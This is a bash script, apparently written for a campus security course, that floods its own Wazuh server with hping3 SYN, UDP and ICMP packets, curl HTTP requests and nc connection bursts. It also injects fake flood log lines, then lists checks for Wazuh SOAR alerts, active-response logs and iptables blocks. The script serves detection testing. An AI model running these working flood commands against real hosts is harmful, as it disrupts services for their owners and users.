#!/bin/bash
# ===================================================
# Simulasi DDoS Attack + SOAR Validation
# Jalankan di Agent (laptop) untuk trigger Wazuh alerts
# HANYA UNTUK TUJUAN EDUKASI - TUGAS KAMPUS
#
# UPDATE: Ditambahkan fase SOAR validation untuk
# membuktikan automated response bekerja
# ===================================================

echo "================================================="
echo "   SIMULASI: DDoS ATTACK + SOAR VALIDATION"
echo "================================================="
echo "[WARNING] Ini hanya simulasi untuk tujuan edukasi!"
echo ""

TARGET="70.153.19.42"
LOG_TAG="ddos-simulation"

# Install tools jika belum ada
install_tool() {
    if ! command -v $1 &>/dev/null; then
        echo "  Installing $1..."
        sudo apt-get install -y $1 -qq 2>/dev/null
    fi
}

install_tool hping3
install_tool curl

echo "============================================"
echo "  FASE 1: DDoS ATTACK SIMULATION"
echo "============================================"
echo ""

echo "[1/5] SYN Flood Simulation (TCP flood ke port 80)..."
# Log SYN flood events agar Wazuh Rule 100050 terpicu
for i in $(seq 1 20); do
    logger -t "$LOG_TAG" "SYN flood attempt $i to $TARGET:80 - SYN_RECV state detected"
    logger -t "kernel" "TCP: SYN flood detected on port 80, SYN_RECV queue full"
done
# Kirim actual SYN packet jika hping3 tersedia
if command -v hping3 &>/dev/null; then
    sudo hping3 -S --flood -V -p 80 $TARGET -c 500 2>/dev/null &
    HPING_PID=$!
    sleep 3
    kill $HPING_PID 2>/dev/null
    echo "  [DONE] 500 SYN packets sent + 20 SYN flood logs"
else
    echo "  [DONE] 20 SYN flood logs terkirim (hping3 tidak tersedia)"
fi

echo ""
echo "[2/5] UDP Flood Simulation..."
for i in $(seq 1 20); do
    logger -t "$LOG_TAG" "UDP flood attempt $i to $TARGET:53 - UDP_FLOOD detected"
    logger -t "kernel" "UDP flood warning: high rate UDP packets on port 53"
done
if command -v hping3 &>/dev/null; then
    sudo hping3 --udp --flood -p 53 $TARGET -c 300 2>/dev/null &
    HPING_PID=$!
    sleep 3
    kill $HPING_PID 2>/dev/null
    echo "  [DONE] 300 UDP packets sent + 20 UDP flood logs"
else
    echo "  [DONE] 20 UDP flood logs terkirim"
fi

echo ""
echo "[3/5] HTTP Flood Simulation (Layer 7 DDoS)..."
# Log HTTP flood events agar Wazuh Rule 100051 terpicu
for i in $(seq 1 30); do
    logger -t "$LOG_TAG" "HTTP flood request $i - connection flood to $TARGET:443"
done
# Kirim actual HTTP requests
for i in $(seq 1 100); do
    curl -s -o /dev/null -m 2 "http://$TARGET/?flood=$i&$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 10)" 2>/dev/null &
done
wait
echo "  [DONE] 100 HTTP requests sent + 30 HTTP flood logs"

echo ""
echo "[4/5] ICMP Flood Simulation (Ping flood)..."
for i in $(seq 1 20); do
    logger -t "$LOG_TAG" "ICMP flood attempt $i - ping flood to $TARGET"
    logger -t "kernel" "ICMP flood detected: high rate ICMP packets from agent"
done
if command -v hping3 &>/dev/null; then
    sudo hping3 --icmp --flood $TARGET -c 200 2>/dev/null &
    HPING_PID=$!
    sleep 3
    kill $HPING_PID 2>/dev/null
    echo "  [DONE] 200 ICMP packets sent + 20 ICMP flood logs"
else
    sudo ping -f -c 200 $TARGET 2>/dev/null || ping -c 200 -i 0.001 $TARGET 2>/dev/null
    echo "  [DONE] ICMP flood selesai + 20 ICMP flood logs"
fi

echo ""
echo "[5/5] Connection Exhaustion + DDoS Pattern Logs..."
# Buka banyak koneksi sekaligus
for i in $(seq 1 50); do
    (echo "" | nc -w 1 $TARGET 80 2>/dev/null) &
done
wait
# Log DDoS pattern agar Rule 100053 terpicu
for i in $(seq 1 30); do
    logger -t "kernel" "POSSIBLE DDoS ATTACK: $i connections from $TARGET"
    logger -t "$LOG_TAG" "HIGH TRAFFIC ANOMALY: connection flood detected attempt $i"
done
# Log tambahan untuk multi-vector detection (Rule 100055)
for i in $(seq 1 10); do
    logger -t "$LOG_TAG" "DDoS ATTACK multi-vector: SYN flood + HTTP flood + ICMP flood detected simultaneously attempt $i"
done
echo "  [DONE] 50 parallel connections + 70 anomaly logs"

echo ""
echo "============================================"
echo "  FASE 2: SOAR VALIDATION"
echo "============================================"
echo ""
echo "Menunggu 30 detik agar Wazuh proses semua log..."
echo "(Active Response butuh waktu untuk trigger)"
echo ""

for i in $(seq 30 -1 1); do
    printf "\r  Countdown: %2d detik..." $i
    sleep 1
done
echo ""
echo ""

echo "[VALIDASI] Cek apakah SOAR bekerja:"
echo ""

# Cek 1: Apakah ada rules DDoS yang terpicu
echo "  [1] Cek alert DDoS di server:"
echo "      ssh wazuh-manager@70.153.19.42"
echo "      sudo grep -i 'ddos\|100050\|100051\|100052\|100053\|100054\|100055' /var/ossec/logs/alerts/alerts.json | tail -5"
echo ""

# Cek 2: Apakah Active Response log ada
echo "  [2] Cek Active Response log:"
echo "      sudo tail -20 /var/ossec/logs/active-responses.log"
echo ""

# Cek 3: Apakah IP terblokir
echo "  [3] Cek IP yang diblokir (bukti SOAR bekerja):"
echo "      sudo iptables -L INPUT -n | grep DROP"
echo ""

# Cek 4: Apakah SYN cookies aktif
echo "  [4] Cek SYN cookies (global mitigation):"
echo "      cat /proc/sys/net/ipv4/tcp_syncookies"
echo "      (Harus output: 1)"
echo ""

echo "============================================"
echo "  FASE 3: CEK DI DASHBOARD"
echo "============================================"
echo ""
echo "  1. Login ke Dashboard https://70.153.19.42:443"
echo "  2. Buka Threat Hunting / Security Events"
echo "  3. Filter untuk DDoS SOAR alerts:"
echo ""
echo "     rule.id: 100050 OR rule.id: 100051 OR rule.id: 100052"
echo "     OR rule.id: 100053 OR rule.id: 100054 OR rule.id: 100055"
echo ""
echo "  4. Atau filter by group:"
echo "     rule.groups: soar"
echo ""
echo "  5. Screenshot yang perlu diambil:"
echo "     a) Alert DDoS di Security Events"
echo "     b) Detail rule SOAR yang terpicu"
echo "     c) Active Response log (bukti IP diblokir)"
echo "     d) iptables output (bukti firewall rule ditambah)"
echo ""
echo "================================================="
echo "SIMULASI DDoS + SOAR SELESAI!"
echo "================================================="
